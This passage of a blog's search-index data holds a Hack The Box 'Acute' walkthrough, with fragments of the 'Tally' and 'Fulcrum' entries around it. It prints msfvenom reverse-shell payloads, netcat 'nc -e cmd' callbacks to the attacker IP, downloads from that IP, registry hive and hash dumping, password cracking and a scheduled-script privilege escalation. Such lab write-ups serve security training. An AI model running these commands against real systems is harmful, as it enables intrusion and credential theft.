2023","hero":"/posts/cybersecurity/hackthebox/machines/windows/tally/images/tally.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/windows/tally/","summary":"Tally Enumeration nmap └─$ nmap -Pn -p- 10.10.10.59 --min-rate 10000 Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-30 20:46 BST Warning: 10.10.10.59 giving up on port because retransmission cap hit (10). Nmap scan report for 10.10.10.59 (10.10.10.59) Host is up (0.10s latency). Not shown: 60269 filtered tcp ports (no-response), 5257 closed tcp ports (conn-refused) PORT STATE SERVICE 21/tcp open ftp 80/tcp open http 81/tcp open hosts2-ns 135/tcp open msrpc 139/tcp open netbios-ssn 445/tcp open microsoft-ds 808/tcp open ccproxy-http 1433/tcp open ms-sql-s 5985/tcp open wsman 15567/tcp open unknown 32843/tcp open unknown 32844/tcp open unknown 32846/tcp open unknown 47001/tcp open winrm 49664/tcp open unknown 49665/tcp open unknown 49666/tcp open unknown 49667/tcp open unknown 49668/tcp open unknown 49669/tcp open unknown 49670/tcp open unknown Nmap done: 1 IP address (1 host up) scanned in 83.","tags":["HTB","sharepoint","mssql","keepass","hashcat","kpcli","crackmapexec","smbclient","smbmap","impacket-mssqlclient","xp-cmdshell","firefox","user-agent","searchsploit","cve-2016-1960","shellcode","python","scheduled-task","cve-2017-0213"],"title":"[HTB] Machine: Tally"},{"categories":null,"contents":"Acute Enumeration nmap └─$ nmap -Pn -p- 10.10.11.145 -T4 --min-rate 10000 Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-27 18:20 BST Nmap scan report for 10.10.11.145 (10.10.11.145) Host is up (0.12s latency). Not shown: 65534 filtered tcp ports (no-response) PORT STATE SERVICE 443/tcp open https Nmap done: 1 IP address (1 host up) scanned in 33.16 seconds └─$ nmap -Pn -p443 -sC -sV 10.10.11.145 -T4 --min-rate 10000 Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-27 18:21 BST Nmap scan report for 10.10.11.145 (10.10.11.145) Host is up (0.095s latency). PORT STATE SERVICE VERSION 443/tcp open ssl/http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found | ssl-cert: Subject: commonName=atsserver.acute.local | Subject Alternative Name: DNS:atsserver.acute.local, DNS:atsserver | Not valid before: 2022-01-06T06:34:58 |_Not valid after: 2030-01-04T06:34:58 | tls-alpn: |_ http/1.1 |_ssl-date: 2023-09-27T17:21:14+00:00; -41s from scanner time. Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: |_clock-skew: -41s Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 21.34 seconds Web server ![]\nferoxbuster └─$ feroxbuster -u https://atsserver.acute.local -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -k --depth 2 ___ ___ __ __ __ __ __ ___ |__ |__ |__) |__) | / ` / \\ \\_/ | | \\ |__ | |___ | \\ | \\ | \\__, \\__/ / \\ | |__/ |___ by Ben \u0026#34;epi\u0026#34; Risher 🤓 ver: 2.10.0 ───────────────────────────┬────────────────────── 🎯 Target Url │ https://atsserver.acute.local 🚀 Threads │ 50 📖 Wordlist │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt 👌 Status Codes │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500] 💥 Timeout (secs) │ 7 🦡 User-Agent │ feroxbuster/2.10.0 💉 Config File │ /etc/feroxbuster/ferox-config.toml 🔎 Extract Links │ true 🏁 HTTP methods │ [GET] 🔓 Insecure │ true 🔃 Recursion Depth │ 2 ───────────────────────────┴────────────────────── 🏁 Press [ENTER] to use the Scan Management Menu™ ────────────────────────────────────────────────── 200 GET 818l 1728w 26105c https://atsserver.acute.local/Acute/core.css 200 GET 2l 15w 1426c https://atsserver.acute.local/Acute/wp-embed.js 301 GET 2l 10w 167c https://atsserver.acute.local/aspnet_client =\u0026gt; https://atsserver.acute.local/aspnet_client/ 200 GET 2l 378w 11224c https://atsserver.acute.local/Acute/jquery-migrate.js Possible usernames And doc file with default password And info about remote training on https://atsserver.acute.local/Acute_Staff_Access └─$ exiftool New_Starter_CheckList_v7.docx ExifTool Version Number : 12.64 File Name : New_Starter_CheckList_v7.docx Directory : . File Size : 35 kB File Modification Date/Time : 2023:09:27 18:34:18+01:00 File Access Date/Time : 2023:09:27 18:34:25+01:00 File Inode Change Date/Time : 2023:09:27 18:34:19+01:00 File Permissions : -rw-r--r-- File Type : DOCX File Type Extension : docx MIME Type : application/vnd.openxmlformats-officedocument.wordprocessingml.document Zip Required Version : 20 Zip Bit Flag : 0x0006 Zip Compression : Deflated Zip Modify Date : 1980:01:01 00:00:00 Zip CRC : 0x079b7eb2 Zip Compressed Size : 428 Zip Uncompressed Size : 2527 Zip File Name : [Content_Types].xml Creator : FCastle Description : Created on Acute-PC01 Last Modified By : Daniel Revision Number : 8 Last Printed : 2021:01:04 15:54:00Z Create Date : 2021:12:08 14:21:00Z Modify Date : 2021:12:22 00:39:00Z Template : Normal.dotm Total Edit Time : 2.6 hours Pages : 3 Words : 886 Characters : 5055 Application : Microsoft Office Word Doc Security : None Lines : 42 Paragraphs : 11 Scale Crop : No Heading Pairs : Title, 1 Titles Of Parts : Company : University of Marvel Links Up To Date : No Characters With Spaces : 5930 Shared Doc : No Hyperlinks Changed : No App Version : 16.0000 Foothold User list based on exiftool hint We also computer name Acute-PC01 AWallace CHall EDavies IMonks JMorgan LHopkins The working creds are EDavies:Password1! Let\u0026rsquo;s upgrade from webshell to reverse shell Generate a payload using msfvenom and upload it to box └─$ msfvenom -p windows/x64/shell_reverse_tcp LPORT=6666 LHOST=10.10.16.9 -f exe -o rev.exe [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload [-] No arch selected, selecting arch: x64 from the payload No encoder specified, outputting raw payload Payload size: 460 bytes Final size of exe file: 7168 bytes Saved as: rev.exe But the shell doesn\u0026rsquo;t work due to Defender We can check if there are any exclusion folders in Defender PS C:\\Users\\edavies\\Documents\u0026gt; reg query \u0026#34;HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths\u0026#34; HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths C:\\Utils REG_DWORD 0x0 C:\\Windows\\System32 REG_DWORD 0x0 Run the payload Suddenly, the shell closes So I tried with the nc But it closes too I would probably have to try meterpreter and migrate to another process I got the shell back and migrated User #1 We have a different ip C:\\utils\u0026gt;ipconfig ipconfig Windows IP Configuration Ethernet adapter Ethernet 2: Connection-specific DNS Suffix . : Link-local IPv6 Address . . . . . : fe80::9513:4361:23ec:64fd%14 IPv4 Address. . . . . . . . . . . : 172.16.22.2 Subnet Mask . . . . . . . . . . . : 255.255.255.0 Default Gateway . . . . . . . . . : 172.16.22.1 Let\u0026rsquo;s run winpeas We have an open rdp session We can perform screenshare to check the rdp session And we see powershell terminal with acute\\monks and his password w3_4R3_th3_f0rce. The creds are used to create a PSSession on ATSSERVER And dc_manage configuration is used Let\u0026rsquo;s try the creds Enter-PSSession doesn\u0026rsquo;t work PS C:\\Windows\\system32\u0026gt; $pass = ConvertTo-SecureString \u0026#34;W3_4R3_th3_f0rce.\u0026#34; -AsPlainText -Force $pass = ConvertTo-SecureString \u0026#34;W3_4R3_th3_f0rce.\u0026#34; -AsPlainText -Force PS C:\\Windows\\system32\u0026gt; $cred = New-Object System.Management.Automation.PSCredential(\u0026#34;acute\\imonks\u0026#34;, $pass) $cred = New-Object System.Management.Automation.PSCredential(\u0026#34;acute\\imonks\u0026#34;, $pass) PS C:\\Windows\\system32\u0026gt; Enter-PSSession -ComputerName ATSSERVER -Credential $cred Enter-PSSession -ComputerName ATSSERVER -Credential $cred Enter-PSSession : Connecting to remote server ATSSERVER failed with the following error message : Access is denied. For more information, see the about_Remote_Troubleshooting Help topic. At line:1 char:1 + Enter-PSSession -ComputerName ATSSERVER -Credential $cred + ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ + CategoryInfo : InvalidArgument: (ATSSERVER:String) [Enter-PSSession], PSRemotingTransportException + FullyQualifiedErrorId : CreateRemoteRunspaceFailed Lets try to use dc_manage configuration But it fails, since imonks doesn\u0026rsquo;t have access to Measure-Object cmdlet PS C:\\Windows\\system32\u0026gt; Enter-PSSession -ComputerName ATSSERVER -Credential $cred -ConfigurationName dc_manage Enter-PSSession -ComputerName ATSSERVER -Credential $cred -ConfigurationName dc_manage Enter-PSSession : The term \u0026#39;Measure-Object\u0026#39; is not recognized as the name of a cmdlet, function, script file, or operable program. Check the spelling of the name, or if a path was included, verify that the path is correct and try again. At line:1 char:1 + Enter-PSSession -ComputerName ATSSERVER -Credential $cred -Configurat ... + ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ + CategoryInfo : ObjectNotFound: (Measure-Object:String) [Enter-PSSession], CommandNotFoundException + FullyQualifiedErrorId : CommandNotFoundException But Invoke-Command works PS C:\\Windows\\system32\u0026gt; Invoke-Command -ScriptBlock { whoami } -ComputerName ATSSERVER -Credential $cred -ConfigurationName dc_manage Invoke-Command -ScriptBlock { whoami } -ComputerName ATSSERVER -Credential $cred -ConfigurationName dc_manage acute\\imonks We can grab the flag PS C:\\Windows\\system32\u0026gt; Invoke-Command -ScriptBlock { type C:\\users\\imonks\\desktop\\user.txt} -ComputerName ATSSERVER -Credential $cred -ConfigurationName dc_manage Invoke-Command -ScriptBlock { type C:\\users\\imonks\\desktop\\user.txt} -ComputerName ATSSERVER -Credential $cred -ConfigurationName dc_manage ad5911a771148082f9c073e069f023eb User #2 The list of commands we can perform as imonks PS C:\\Windows\\system32\u0026gt; Invoke-Command -ScriptBlock { Get-Command } -ComputerName ATSSERVER -Credential $cred -ConfigurationName dc_manage Invoke-Command -ScriptBlock { Get-Command } -ComputerName ATSSERVER -Credential $cred -ConfigurationName dc_manage CommandType Name Version Source PSComputerName ----------- ---- ------- ------ -------------- Cmdlet Get-Alias 3.1.0.0 Microsoft.PowerSh... ATSSERVER Cmdlet Get-ChildItem 3.1.0.0 Microsoft.PowerSh... ATSSERVER Cmdlet Get-Command 3.0.0.0 Microsoft.PowerSh... ATSSERVER Cmdlet Get-Content 3.1.0.0 Microsoft.PowerSh... ATSSERVER Cmdlet Get-Location 3.1.0.0 Microsoft.PowerSh... ATSSERVER Cmdlet Set-Content 3.1.0.0 Microsoft.PowerSh... ATSSERVER Cmdlet Set-Location 3.1.0.0 Microsoft.PowerSh... ATSSERVER Cmdlet Write-Output 3.1.0.0 Microsoft.PowerSh... ATSSERVER PS C:\\Windows\\system32\u0026gt; Invoke-Command -ScriptBlock { Get-Alias} -ComputerName ATSSERVER -Credential $cred -ConfigurationName dc_manage Invoke-Command -ScriptBlock { Get-Alias} -ComputerName ATSSERVER -Credential $cred -ConfigurationName dc_manage CommandType Name Version Source PSComputerName ----------- ---- ------- ------ -------------- Alias cat -\u0026gt; Get-Content ATSSERVER Alias cd -\u0026gt; Set-Location ATSSERVER Alias echo -\u0026gt; Write-Output ATSSERVER Alias ls -\u0026gt; Get-ChildItem ATSSERVER Alias pwd -\u0026gt; Get-Location ATSSERVER Alias sc -\u0026gt; Set-Content ATSSERVER Alias type -\u0026gt; Get-Content ATSSERVER We have a Hyper-V But can\u0026rsquo;t access it PS C:\\Windows\\system32\u0026gt; Invoke-Command -ScriptBlock { ls \u0026#39;\\program files\u0026#39;} -ComputerName ATSSERVER -Credential $cred -ConfigurationName dc_manage Invoke-Command -ScriptBlock { ls \u0026#39;\\program files\u0026#39;} -ComputerName ATSSERVER -Credential $cred -ConfigurationName dc_manage Directory: C:\\program files Mode LastWriteTime Length Name PSComputerName ---- ------------- ------ ---- -------------- d----- 21/12/2021 00:04 common files ATSSERVER d----- 21/12/2021 00:11 Hyper-V ATSSERVER d----- 15/09/2018 08:12 internet explorer ATSSERVER d----- 01/02/2022 19:41 keepmeon ATSSERVER d----- 21/12/2021 00:04 VMware ATSSERVER d----- 20/12/2021 21:19 Windows Defender ATSSERVER d----- 20/12/2021 21:12 Windows Defender Advanced Threat ATSSERVER Protection d----- 21/12/2021 14:13 WindowsPowerShell ATSSERVER And also the wm.ps1 script on imonks\u0026rsquo; desktop It contains jmorgan\u0026rsquo;s creds PS C:\\Windows\\system32\u0026gt; Invoke-Command -ScriptBlock { ls \u0026#39;\\users\\imonks\\desktop\u0026#39;} -ComputerName ATSSERVER -Credential $cred -ConfigurationName dc_manage Invoke-Command -ScriptBlock { ls \u0026#39;\\users\\imonks\\desktop\u0026#39;} -ComputerName ATSSERVER -Credential $cred -ConfigurationName dc_manage Directory: C:\\users\\imonks\\desktop Mode LastWriteTime Length Name PSComputerName ---- ------------- ------ ---- -------------- -ar--- 01/10/2023 10:04 34 user.txt ATSSERVER -a---- 11/01/2022 18:04 602 wm.ps1 ATSSERVER PS C:\\Windows\\system32\u0026gt; Invoke-Command -ScriptBlock { type \u0026#39;\\users\\imonks\\desktop\\wm.ps1\u0026#39;} -ComputerName ATSSERVER -Credential $cred -ConfigurationName dc_manage Invoke-Command -ScriptBlock { type \u0026#39;\\users\\imonks\\desktop\\wm.ps1\u0026#39;} -ComputerName ATSSERVER -Credential $cred -ConfigurationName dc_manage $securepasswd = \u0026#39;01000000d08c9ddf0115d1118c7a00c04fc297eb0100000096ed5ae76bd0da4c825bdd9f24083e5c0000000002000000000003660000c00000001000000080f704e251793f5d4f903c7158c8213d0000000004800000a000000010000000ac2606ccfda6b4e0a9d56a20417d2f67280000009497141b794c6cb963d2460bd96ddcea35b25ff248a53af0924572cd3ee91a28dba01e062ef1c026140000000f66f5cec1b264411d8a263a2ca854bc6e453c51\u0026#39; $passwd = $securepasswd | ConvertTo-SecureString $creds = New-Object System.Management.Automation.PSCredential (\u0026#34;acute\\jmorgan\u0026#34;, $passwd) Invoke-Command -ScriptBlock {Get-Volume} -ComputerName Acute-PC01 -Credential $creds jmorgan is local Administrator PS C:\\Windows\\system32\u0026gt; net user jmorgan /domain net user jmorgan /domain The request will be processed at a domain controller for domain acute.local. User name jmorgan Full Name Joshua Morgan Comment User\u0026#39;s comment Country/region code 000 (System Default) Account active Yes Account expires Never Password last set 21/12/2021 23:48:38 Password expires Never Password changeable 22/12/2021 23:48:38 Password required Yes User may change password No Workstations allowed All Logon script User profile Home directory Last logon 11/01/2022 21:06:05 Logon hours allowed All Local Group Memberships Global Group memberships *Domain Users The command completed successfully. PS C:\\Windows\\system32\u0026gt; net localgroup Administrators net localgroup Administrators Alias name Administrators Comment Administrators have complete and unrestricted access to the computer/domain Members ------------------------------------------------------------------------------- ACUTE\\Domain Admins ACUTE\\jmorgan Administrator The command completed successfully. We can try changing the content of the script and then run it PS C:\\utils\u0026gt; Invoke-Command -ScriptBlock { ((cat c:\\users\\imonks\\desktop\\wm.ps1 -Raw) -replace \u0026#39;Get-Volume\u0026#39;, \u0026#39;c:\\utils\\nc.exe -e cmd 10.10.16.9 7777\u0026#39;) | sc -Path c:\\users\\imonks\\desktop\\wm.ps1 } -ComputerName ATSSERVER -Credential $cred -ConfigurationName dc_manage Invoke-Command -ScriptBlock { ((cat c:\\users\\imonks\\desktop\\wm.ps1 -Raw) -replace \u0026#39;Get-Volume\u0026#39;, \u0026#39;c:\\utils\\nc.exe -e cmd 10.10.16.9 7777\u0026#39;) | sc -Path c:\\users\\imonks\\desktop\\wm.ps1 } -ComputerName ATSSERVER -Credential $cred -ConfigurationName dc_manage PS C:\\utils\u0026gt; Invoke-Command -ScriptBlock { type \u0026#39;c:\\users\\imonks\\desktop\\wm.ps1\u0026#39;} -ComputerName ATSSERVER -Credential $cred -ConfigurationName dc_manage Invoke-Command -ScriptBlock { type \u0026#39;c:\\users\\imonks\\desktop\\wm.ps1\u0026#39;} -ComputerName ATSSERVER -Credential $cred -ConfigurationName dc_manage $securepasswd = \u0026#39;01000000d08c9ddf0115d1118c7a00c04fc297eb0100000096ed5ae76bd0da4c825bdd9f24083e5c0000000002000000000003660000c00000001000000080f704e251793f5d4f903c7158c8213d0000000004800000a000000010000000ac2606ccfda6b4e0a9d56a20417d2f67280000009497141b794c6cb963d2460bd96ddcea35b25ff248a53af0924572cd3ee91a28dba01e062ef1c026140000000f66f5cec1b264411d8a263a2ca854bc6e453c51\u0026#39; $passwd = $securepasswd | ConvertTo-SecureString $creds = New-Object System.Management.Automation.PSCredential (\u0026#34;acute\\jmorgan\u0026#34;, $passwd) Invoke-Command -ScriptBlock {c:\\utils\\nc.exe -e cmd 10.10.16.9 7777} -ComputerName Acute-PC01 -Credential $creds PS C:\\utils\u0026gt; Invoke-Command -ScriptBlock { C:\\users\\imonks\\desktop\\wm.ps1 } -ComputerName ATSSERVER -Credential $cred -ConfigurationName dc_manage Invoke-Command -ScriptBlock { C:\\users\\imonks\\desktop\\wm.ps1 } -ComputerName ATSSERVER -Credential $cred -ConfigurationName dc_manage User #3 Since we are local admin, we can dump the hashes C:\\Users\\jmorgan\u0026gt;cd c:\\utils cd c:\\utils c:\\Utils\u0026gt;reg save HKLM\\sam sam.hive reg save HKLM\\sam sam.hive The operation completed successfully. c:\\Utils\u0026gt;reg save HKLM\\system sys.hive reg save HKLM\\system sys.hive The operation completed successfully. c:\\Utils\u0026gt;reg save HKLM\\security security.hive reg save HKLM\\security security.hive The operation completed successfully. c:\\Utils\u0026gt;dir dir Volume in drive C has no label. Volume Serial Number is 8A9A-E124 Directory of c:\\Utils 01/10/2023 11:45 \u0026lt;DIR\u0026gt; . 01/10/2023 11:45 \u0026lt;DIR\u0026gt; .. 01/10/2023 11:31 45,272 nc.exe 01/10/2023 10:19 7,168 rev.exe 01/10/2023 11:45 57,344 sam.hive 01/10/2023 11:45 45,056 security.hive 01/10/2023 11:45 12,140,544 sys.hive 01/10/2023 10:25 2,388,480 winpeas.exe 6 File(s) 14,683,864 bytes 2 Dir(s) 8,145,170,432 bytes free We can download them using meterpreter session meterpreter \u0026gt; download *.hive [*] downloading: .\\sam.hive -\u0026gt; /home/kali/sam.hive [*] Completed : .\\sam.hive -\u0026gt; /home/kali/sam.hive [*] downloading: .\\security.hive -\u0026gt; /home/kali/security.hive [*] Completed : .\\security.hive -\u0026gt; /home/kali/security.hive [*] downloading: .\\sys.hive -\u0026gt; /home/kali/sys.hive [*] Completed : .\\sys.hive -\u0026gt; /home/kali/sys.hive Dump the hashes via impacket-secretsdump └─$ impacket-secretsdump -system sys.hive -sam sam.hive -security security.hive LOCAL Impacket v0.11.0 - Copyright 2023 Fortra [*] Target system bootKey: 0x44397c32a634e3d8d8f64bff8c614af7 [*] Dumping local SAM hashes (uid:rid:lmhash:nthash) Administrator:500:aad3b435b51404eeaad3b435b51404ee:a29f7623fd11550def0192de9246f46b::: Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:24571eab88ac0e2dcef127b8e9ad4740::: Natasha:1001:aad3b435b51404eeaad3b435b51404ee:29ab86c5c4d2aab957763e5c1720486d::: [*] Dumping cached domain logon information (domain/username:hash) [*] Dumping LSA Secrets [*] $MACHINE.ACC $MACHINE.ACC:plain_password_hex:fea3d42f1345540c9139026b04d7dacaf74ac50fea3909d5aa92d96842a17687ba76231aabf9918d7bb803c0cffab7e37c82401c6c38d1b5a22ebdd305f00168f2be133b8cb9cdd7b151594d018c6e8686f9f122ceeeaadeec989afcde927ca1bbe8ebc9a27f0c2323d2f52826d37ca980064d78a2d6535f66e2b4c3472d9f21e110b485fbaa8e4baf3c0a3f9bfdf732a4ea6ee489c226f56f1c994195914099fbfdfde3cb6e3edf836d718cb478a02ef14cc7697c5f181e4f9ce8ca7dc96cd0b815dbc093a46a0ac955c6e06fa0d33214264a99a6a662325992a3bf416b83f5001c4ffc02e29bc575726baa0f277bea $MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:99dc50a2db7d91abd91fbc8a597c6eb5 [*] DPAPI_SYSTEM dpapi_machinekey:0x574d0cc939c9f986cba32d1546a7fa28747425e0 dpapi_userkey:0x4a77ea6673a027ecd81e4ca010b1d3f70fe1d9cd [*] NL$KM 0000 62 2A 29 8D F9 77 CC DD EE EB 23 20 B2 E2 AF 59 b*)..w....# ...Y 0010 0B F6 33 E0 95 5D B0 03 B1 01 85 55 9D 16 64 4D ..3..].....U..dM 0020 53 1F 93 7B FB EF 2B F7 6E 76 B1 02 3D 63 CC DF S..{..+.nv..=c.. 0030 F0 35 6F E3 19 8A 69 C1 2E F6 78 80 45 51 EE 0A .5o...i...x.EQ.. NL$KM:622a298df977ccddeeeb2320b2e2af590bf633e0955db003b10185559d16644d531f937bfbef2bf76e76b1023d63ccdff0356fe3198a69c12ef678804551ee0a [*] Cleaning up... Let\u0026rsquo;s crack the password └─$ hashcat -m 1000 hash /usr/share/wordlists/rockyou.txt hashcat (v6.2.6) starting OpenCL API (OpenCL 3.0 PoCL 3.1+debian Linux, None+Asserts, RELOC, SPIR, LLVM 15.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project] ================================================================================================================================================== * Device #1: pthread-sandybridge-12th Gen Intel(R) Core(TM) i5-12400, 1436/2936 MB (512 MB allocatable), 2MCU ... a29f7623fd11550def0192de9246f46b:Password@123 Approaching final keyspace - workload adjusted. ... The password for Administrator is Password@123 Let\u0026rsquo;s check for password-reuse We have awallace and lhopkins PS C:\\utils\u0026gt; Invoke-Command -ScriptBlock { ls C:\\users\\ } -ComputerName ATSSERVER -Credential $cred -ConfigurationName dc_manage Invoke-Command -ScriptBlock { ls C:\\users\\ } -ComputerName ATSSERVER -Credential $cred -ConfigurationName dc_manage Directory: C:\\users Mode LastWriteTime Length Name PSComputerName ---- ------------- ------ ---- -------------- d----- 20/12/2021 23:30 .NET v4.5 ATSSERVER d----- 20/12/2021 23:30 .NET v4.5 Classic ATSSERVER d----- 20/12/2021 20:38 Administrator ATSSERVER d----- 21/12/2021 23:31 awallace ATSSERVER d----- 21/12/2021 16:01 imonks ATSSERVER d----- 22/12/2021 00:11 lhopkins ATSSERVER d-r--- 20/12/2021 20:38 Public ATSSERVER Let\u0026rsquo;s start with awallace And the creds work PS C:\\utils\u0026gt; $pass = ConvertTo-SecureString \u0026#34;Password@123\u0026#34; -AsPlainText -Force $pass = ConvertTo-SecureString \u0026#34;Password@123\u0026#34; -AsPlainText -Force PS C:\\utils\u0026gt; $cred = New-Object System.Management.Automation.PSCredential(\u0026#34;ACUTE\\awallace\u0026#34;, $pass) $cred = New-Object System.Management.Automation.PSCredential(\u0026#34;ACUTE\\awallace\u0026#34;, $pass) PS C:\\utils\u0026gt; Invoke-Command -ScriptBlock { whoami } -ComputerName ATSSERVER -Credential $cred -ConfigurationName dc_manage Invoke-Command -ScriptBlock { whoami } -ComputerName ATSSERVER -Credential $cred -ConfigurationName dc_manage acute\\awallace PS C:\\utils\u0026gt; Root We have an interesting folder in Program files named keepmeon It contains a bat that runs every 5 minutes which calls bat files inside the folder PS C:\\utils\u0026gt; Invoke-Command -ScriptBlock { ls \u0026#39;\\program files\\\u0026#39;} -ComputerName ATSSERVER -Credential $cred -ConfigurationName dc_manage Invoke-Command -ScriptBlock { ls \u0026#39;\\program files\\\u0026#39;} -ComputerName ATSSERVER -Credential $cred -ConfigurationName dc_manage Directory: C:\\program files Mode LastWriteTime Length Name PSComputerName ---- ------------- ------ ---- -------------- d----- 21/12/2021 00:04 common files ATSSERVER d----- 21/12/2021 00:11 Hyper-V ATSSERVER d----- 15/09/2018 08:12 internet explorer ATSSERVER d----- 01/02/2022 19:41 keepmeon ATSSERVER d----- 21/12/2021 00:04 VMware ATSSERVER d----- 20/12/2021 21:19 Windows Defender ATSSERVER d----- 20/12/2021 21:12 Windows Defender Advanced Threat ATSSERVER Protection d----- 21/12/2021 14:13 WindowsPowerShell ATSSERVER PS C:\\utils\u0026gt; Invoke-Command -ScriptBlock { ls \u0026#39;\\program files\\keepmeon\u0026#39;} -ComputerName ATSSERVER -Credential $cred -ConfigurationName dc_manage Invoke-Command -ScriptBlock { ls \u0026#39;\\program files\\keepmeon\u0026#39;} -ComputerName ATSSERVER -Credential $cred -ConfigurationName dc_manage Directory: C:\\program files\\keepmeon Mode LastWriteTime Length Name PSComputerName ---- ------------- ------ ---- -------------- -a---- 21/12/2021 14:57 128 keepmeon.bat ATSSERVER PS C:\\utils\u0026gt; Invoke-Command -ScriptBlock { type \u0026#39;\\program files\\keepmeon\\keepmeon.bat\u0026#39;} -ComputerName ATSSERVER -Credential $cred -ConfigurationName dc_manage Invoke-Command -ScriptBlock { type \u0026#39;\\program files\\keepmeon\\keepmeon.bat\u0026#39;} -ComputerName ATSSERVER -Credential $cred -ConfigurationName dc_manage REM This is run every 5 minutes. For Lois use ONLY @echo off for /R %%x in (*.bat) do ( if not \u0026#34;%%x\u0026#34; == \u0026#34;%~0\u0026#34; call \u0026#34;%%x\u0026#34; ) We also have an interesting group named Site Admin that has access to Domain Admins PS C:\\utils\u0026gt; Invoke-Command -ScriptBlock { net group /domain} -ComputerName ATSSERVER -Credential $cred -ConfigurationName dc_manage Invoke-Command -ScriptBlock { net group /domain} -ComputerName ATSSERVER -Credential $cred -ConfigurationName dc_manage Group Accounts for \\\\ ------------------------------------------------------------------------------- *Cloneable Domain Controllers *DnsUpdateProxy *Domain Admins *Domain Computers *Domain Controllers *Domain Guests *Domain Users *Enterprise Admins *Enterprise Key Admins *Enterprise Read-only Domain Controllers *Group Policy Creator Owners *Key Admins *Managers *Protected Users *Read-only Domain Controllers *Schema Admins *Site_Admin The command completed with one or more errors. PS C:\\utils\u0026gt; Invoke-Command -ScriptBlock { net group Site_Admin /domain } -ComputerName ATSSERVER -Credential $cred -ConfigurationName dc_manage Invoke-Command -ScriptBlock { net group Site_Admin /domain } -ComputerName ATSSERVER -Credential $cred -ConfigurationName dc_manage Group name Site_Admin Comment Only in the event of emergencies is this to be populated. This has access to Domain Admin group Members ------------------------------------------------------------------------------- The command completed successfully. We can add awallace to Site_Admin group using the bat file PS C:\\utils\u0026gt; Invoke-Command -ScriptBlock { Set-Content -Path \u0026#39;c:\\program files\\keepmeon\\pwn.bat\u0026#39; -Value \u0026#39;net group site_admin awallace /add /domain\u0026#39; } -ComputerName ATSSERVER -Credential $cred -ConfigurationName dc_manage Invoke-Command -ScriptBlock { Set-Content -Path \u0026#39;c:\\program files\\keepmeon\\pwn.bat\u0026#39; -Value \u0026#39;net group site_admin awallace /add /domain\u0026#39; } -ComputerName ATSSERVER -Credential $cred -ConfigurationName dc_manage PS C:\\utils\u0026gt; Invoke-Command -ScriptBlock { type \u0026#39;c:\\program files\\keepmeon\\pwn.bat\u0026#39; } -ComputerName ATSSERVER -Credential $cred -ConfigurationName dc_manage Invoke-Command -ScriptBlock { type \u0026#39;c:\\program files\\keepmeon\\pwn.bat\u0026#39; } -ComputerName ATSSERVER -Credential $cred -ConfigurationName dc_manage net group site_admin awallace /add /domain After 5 minutes, we can get our flag PS C:\\utils\u0026gt; Invoke-Command -ScriptBlock { net group Site_Admin /domain } -ComputerName ATSSERVER -Credential $cred -ConfigurationName dc_manage Invoke-Command -ScriptBlock { net group Site_Admin /domain } -ComputerName ATSSERVER -Credential $cred -ConfigurationName dc_manage Group name Site_Admin Comment Only in the event of emergencies is this to be populated. This has access to Domain Admin group Members ------------------------------------------------------------------------------- awallace The command completed successfully. That\u0026rsquo;s enough to get a flag PS C:\\utils\u0026gt; Invoke-Command -ScriptBlock { type c:\\users\\administrator\\desktop\\root.txt } -ComputerName ATSSERVER -Credential $cred -ConfigurationName dc_manage Invoke-Command -ScriptBlock { type c:\\users\\administrator\\desktop\\root.txt } -ComputerName ATSSERVER -Credential $cred -ConfigurationName dc_manage 2f0a007cbe7ae42f526e8afc13cfbcae To get a shell, we can upload nc as awallace to ATTSERVER PS C:\\utils\u0026gt; Invoke-Command -ScriptBlock { wget 10.10.16.9/nc64.exe -outfile c:\\programdata\\nc.exe } -ComputerName ATSSERVER -Credential $cred Invoke-Command -ScriptBlock { wget 10.10.16.9/nc64.exe -outfile c:\\programdata\\nc.exe } -ComputerName ATSSERVER -Credential $cred PS C:\\utils\u0026gt; Invoke-Command -ScriptBlock { c:\\programdata\\nc.exe -e cmd 10.10.16.9 8888} -ComputerName ATSSERVER -Credential $cred Invoke-Command -ScriptBlock { c:\\programdata\\nc.exe -e cmd 10.10.16.9 8888} -ComputerName ATSSERVER -Credential $cred ","date":"September 27, 2023","hero":"/posts/cybersecurity/hackthebox/machines/windows/acute/images/acute.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/windows/acute/","summary":"Acute Enumeration nmap └─$ nmap -Pn -p- 10.10.11.145 -T4 --min-rate 10000 Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-27 18:20 BST Nmap scan report for 10.10.11.145 (10.10.11.145) Host is up (0.12s latency). Not shown: 65534 filtered tcp ports (no-response) PORT STATE SERVICE 443/tcp open https Nmap done: 1 IP address (1 host up) scanned in 33.16 seconds └─$ nmap -Pn -p443 -sC -sV 10.10.11.145 -T4 --min-rate 10000 Starting Nmap 7.94 ( https://nmap.","tags":["HTB","impacket-secretsdump","powershell-web-access","exiftool","meterpreter","metasploit","msfvenom","defender","defender-bypass-directory","screenshare","powershell-runas","powershell-configuration"],"title":"[HTB] Machine: Acute"},{"categories":null,"contents":"Fulcrum Enumeration nmap └─$ nmap -p- 10.10.10.62 